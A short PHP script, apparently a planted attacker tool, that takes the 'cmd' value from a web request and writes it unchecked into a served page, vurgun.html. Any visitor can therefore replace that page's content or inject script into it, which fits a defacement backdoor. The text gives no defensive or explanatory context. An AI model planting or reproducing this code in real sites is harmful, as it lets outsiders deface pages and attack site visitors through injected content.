<?php
  $cmd =$_GET['cmd'];
  $vurgun = fopen('vurgun.html','w+');
  fwrite($vurgun, "$cmd");
  fclose($vurgun);
?>
